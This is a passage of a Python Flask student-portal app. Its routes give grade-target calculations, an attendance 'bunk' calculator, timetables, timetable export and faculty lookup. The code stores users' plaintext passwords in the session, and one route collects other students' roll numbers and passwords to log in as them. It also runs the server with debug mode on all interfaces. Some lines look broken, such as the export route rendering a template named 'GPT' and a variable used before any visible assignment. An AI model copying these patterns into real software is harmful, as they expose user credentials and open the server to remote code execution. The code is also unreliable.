                courses.append(myDict)

    except:
        courses = []

    gpa = return_cgpa({"roll":roll_no, "pass":pwd})

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[1:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    data = courses

    if len(data)>=1:
        # Extract test names from the first dictionary
        test_names = [key for key in data[0] if key not in ("Course", "Title")]

        # Create an empty dictionary to store the scores for each course
        course_scores = {}

        # Iterate through each dictionary in the data
        for d in data:
            # Extract the course code and title
            course_code = d['Course']
            course_title = d['Title']
        
            # Create an empty list to store the scores for this course
            course_scores[course_title] = []
        
            # Iterate through each test name and add the score to the list for this course
            for test_name in test_names:
                score = d.get(test_name)
                if score and score != '*' and score != 'Absent':
                    course_scores[course_title].append(float(score))
                else:
                    course_scores[course_title].append(0)

        # Create a list of labels for the X axis (test names)
        x_labels = test_names

        y_keys = list(course_scores.keys())

        data = course_scores

        internals_weight = 0.4
        finals_weight = 0.6

        conclusions = {}

        for subject, scores in data.items():
            internal = scores[-1]
            # Convert internal score to out of 40
            internal_out_of_40 = (internal / 50) * 40

            # For pass GPA (GPA >= 5), we need the sum (X + Y) = 50
            # Solve for final exam score (Y)
            for_pass = (50 - internal_out_of_40) * (60 / 40)

            # For GPA of 8, we need the sum (X + Y) = 80
            for_8 = (80 - internal_out_of_40) * (60 / 40)

            # For GPA of 8.5, we need the sum (X + Y) = 85
            for_85 = (85 - internal_out_of_40) * (60 / 40)

            # For GPA of 9, we need the sum (X + Y) = 90
            for_9 = (90 - internal_out_of_40) * (60 / 40)

            # Calculate the max GPA based on internal score
            max_gpa = round(((0.6 + 0.4 * (internal / 50)) * 10), 2)

            if for_pass<=100:
                conclusion = f"Score needed to pass: {round(for_pass, 2)}/100<br/><br/>"
                if for_8<=100:
                    conclusion += f"Score needed to get 8: {round(for_8, 2)}/100<br/><br/>"
                else:
                    if maxAdded==False:
                        conclusion += f"Maximum possible grade: {max_gpa}<br/>"
                        maxAdded = True
                if for_85<=100:
                    conclusion += f"Score needed to get 8.5: {round(for_85, 2)}/100<br/><br/>"
                else:
                    if maxAdded==False:
                        conclusion += f"Maximum possible grade: {max_gpa}<br/>"
                        maxAdded = True
                if for_9<=100:
                    conclusion += f"Score needed to get 9: {round(for_9, 2)}/100<br/>"
                else:
                    if maxAdded==False:
                        conclusion += f"Maximum possible grade: {max_gpa}<br/>"
                        maxAdded = True
            else:
                conclusion = "Cannot pass.<br/>"
            conclusions.update({subject:conclusion})
    else:
        x_labels = course_scores = y_keys = conclusions = []

    return render_template("marksheet.html", details = myguy,
                                             courses = courses,
                                             gpa = gpa,
                                             x_labels = x_labels,
                                             y_arrays = course_scores,
                                             y_keys = y_keys,
                                             conclusions = conclusions)

@app.route('/mass-bunk')
@login_required
def massBunk():
    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    jsonTT = timetabler(roll_no, pwd)
    tt = []
    todaytt = None
    total_hrs={}
    total_present={}
    # Get the current time
    now = datetime.datetime.now()

    # If it's after 12 PM, add a day to the current time
    if now.hour >= 12:
        now += datetime.timedelta(days=1)

    # Get the abbreviated day name for the updated time
    day = now.strftime('%A').upper()[:3]
    theday = now.strftime("%A")

    for i in jsonTT.get("courses"):
        if i[0] == day:
            todaytt = i[1:]
            break
    courseMap = {}
    for i in jsonTT.get("courses")[8:]:
        if "TWM" not in i:
            total_hrs.update({i[0]:0})
            total_present.update({i[0]:0})
        courseMap.update({i[0]:i[1]})
    if todaytt != None:
        for i in todaytt:
            try:
                course = " ".join([j.capitalize() for j in courseMap.get(i[-6:]).split(" ")])
            except:
                course = courseMap.get(i[-6:])
            course_code = f"<span class='hide-narrow-mobile'>[{i[-6:].upper()}] </span>"
            if "TWM" in i: course = "TWM"; course_code=""
            tt.append(f"{course_code}{course}")
    else:
        tt = ["Holiday"]
    tt.append("")

    attend = attendor(roll_no, pwd)
    for i in attend[1:]:
        if i[0] in list(total_present.keys()):
            total_hrs.update({i[0]:i[1]})
            total_present.update({i[0]:i[4]})


    input_json = {
                    "class_code": list(total_hrs.keys()),
                    "total_hours": list(total_hrs.values()),
                    "total_present": list(total_present.values()),
                    "threshold": 75
                 }

    courses = input_json['class_code']
    total_class = input_json['total_hours']
    total_present = input_json['total_present']
    threshold = int(input_json['threshold'])
    threshold = (threshold/100)

    bunkables = {}
    for item in range(len(courses)):
        temp = {}
        temp['total_hours'] = int(total_class[item])

        if temp['total_hours']==0:
            temp['total_hours']=1

        temp['total_present'] = int(total_present[item])
        percentage_of_attendance = temp['total_present']/temp['total_hours']
        percentage_of_attendance = round(percentage_of_attendance,2)

        temp['percentage_of_attendance'] = percentage_of_attendance
        if (percentage_of_attendance) <= (threshold):
            temp['class_to_attend'] = math.ceil(((threshold*temp['total_hours']) - temp['total_present'])/(1-threshold))
        
        else:
            temp['class_to_bunk'] = math.floor((temp['total_present']-(threshold*temp['total_hours']))/(threshold))
        
        try:
            course = " ".join([j.capitalize() for j in courseMap.get(courses[item]).split(" ")])
            if "lab" in courseMap.get(courses[item]).lower():
                course = "".join([j.upper()[0] for j in course.split(" ")])[:-1] + " Lab"
        except:
            course = courseMap.get(courses[item])
        temp['course'] = course
        bunkables[courses[item]] = temp

    total_bunkworthy = 0
    for i in list(bunkables.values()):
        if i.get("class_to_bunk"):
            total_bunkworthy+=i["class_to_bunk"]

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[1:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    return render_template("mass-bunk.html", details = myguy,
                                           date = datetime.datetime.now().strftime('%d %b %Y'),
                                           time = datetime.datetime.now().strftime('%H:%M'),
                                           day = theday,
                                           timetable = tt,
                                           bunkworthiness = total_bunkworthy,
                                           bunkables = bunkables,
                                           CYPLst = CYPList())

@app.route('/tools/common-bunkability', methods=['POST'])
@login_required
def getCommonBunkables():
    roll_no = session.get("roll")
    pwd = session.get("pass")

    myBunkables = getBunkables(roll_no, pwd)

    theirBunkables = []

    json_list_str = request.form.get("details").split(", ")
    mydaata = []
    for i in json_list_str:
        if i.strip()!='':
            mydaata.append(i.strip())
    mydata = json.loads(str(mydaata).replace("'",""))
    data = []
    for i in mydata:
        if type(i)==dict:
            data.append(i)

    for i in data:
        theirBunkables.append(getBunkables(list(i.keys())[0], (list(i.values())[0])))
    
    common_bunkables = commonBunkables(myBunkables, *theirBunkables)

    return jsonify({"bunkables": common_bunkables})


@app.route('/tools/campus-map', methods=['GET'])
@login_required
def map():

    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    return render_template('map.html', details=myguy)

@app.route('/tools/time-table')
@login_required
def my_tt():

    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    jsonTT = timetabler(roll_no, pwd)
    tt = []
    todaytt = None
    total_hrs={}
    total_present={}
    # Get the current time
    now = datetime.datetime.now()

    # If it's after 12 PM, add a day to the current time
    if now.hour >= 12:
        now += datetime.timedelta(days=1)

    # Get the abbreviated day name for the updated time
    day = now.strftime('%A').upper()[:3]

    totalTT = []

    print(json.dumps(jsonTT.get("courses"), indent=4))

    for day in ["MON","TUE","WED","THU","FRI","SAT", "SUN"]:
        for i in jsonTT.get("courses"):
            if i[0] == day:
                todaytt = i[1:]
                break
        courseMap = {}
        for i in jsonTT.get("courses")[8:]:
            if "TWM" not in i:
                total_hrs.update({i[0]:0})
                total_present.update({i[0]:0})
            courseMap.update({i[0]:i[1]})
        if todaytt != None:
            for i in todaytt:
                try:
                    course = " ".join([j.capitalize() for j in courseMap.get(i[-6:]).split(" ")])
                except:
                    course = courseMap.get(i[-6:])
                course_code = f"[{i[-6:].upper()}] "
                if "TWM" in i: course = "TWM"; course_code=""
                tt.append(f"{course_code}{course}")
        else:
            tt = ["Holiday"]
        tt.append("")
        totalTT.append(tt)
    myTotal = []
    tdyTT = []
    for i in totalTT[0]:
        if i=="":
            myTotal.append(tdyTT)
            tdyTT = []
        else:
            tdyTT.append(i)

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[0:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    return render_template("time_table.html", data=myTotal, details=myguy)


@app.route('/tools/faculty-lookup')
@login_required
def facLookup():


    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    return render_template("faculty_lookup.html", details=myguy)


@app.route('/tools/view-faculty')
@login_required
def viewFac():

    fac = request.args.get("fac")

    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    return render_template("view_faculty.html", details=myguy, faculty=findFaculty(fac))


@app.route('/tools/faculty-lookup/search')
@login_required
def facSearch():

    query = request.args.get("query")
    return jsonify(searchFaculty(query))

@app.route('/tools/time-table/export')
@login_required
def export_tt():

    roll_no = session.get("roll")
    pwd = session.get("pass")
    myguy = profiler(roll_no, pwd)

    jsonTT = timetabler(roll_no, pwd)
    tt = []
    todaytt = None
    total_hrs={}
    total_present={}
    # Get the current time
    now = datetime.datetime.now()

    # If it's after 12 PM, add a day to the current time
    if now.hour >= 12:
        now += datetime.timedelta(days=1)

    # Get the abbreviated day name for the updated time
    day = now.strftime('%A').upper()[:3]

    totalTT = []

    for day in ["MON","TUE","WED","THU","FRI","SAT", "SUN"]:
        for i in jsonTT.get("courses"):
            if i[0] == day:
                todaytt = i[1:]
                break
        courseMap = {}
        for i in jsonTT.get("courses")[8:]:
            if "TWM" not in i:
                total_hrs.update({i[0]:0})
                total_present.update({i[0]:0})
            courseMap.update({i[0]:i[1]})
        if todaytt != None:
            for i in todaytt:
                try:
                    course = " ".join([j.capitalize() for j in courseMap.get(i[-6:]).split(" ")])
                except:
                    course = courseMap.get(i[-6:])
                course_code = f"[{i[-6:].upper()}] "
                if "TWM" in i: course = "TWM"; course_code=""
                tt.append(f"{course_code}{course}")
        else:
            tt = ["Holiday"]
        tt.append("")
        totalTT.append(tt)
    myTotal = []
    tdyTT = []
    for i in totalTT[0]:
        if i=="":
            myTotal.append(tdyTT)
            tdyTT = []
        else:
            tdyTT.append(i)

    course = myguy["student"][1][2].split(" ")[0].upper()+" "
    inword = True
    for i in myguy["student"][1][2].split(" ")[1:]:
        try:
            i[0].upper()
            if inword:
                if i.isalpha():
                    course+=i[0].upper()
        except:
            inword = False
            break

    return render_template("GPT", data=myTotal, details=myguy)

@app.route("/tools/cyp-get")
def cypGet():
    return CYPItem(int(request.args.get("id")))

if __name__ == '__main__':
    app.run(port=5003, host='0.0.0.0',debug=True)
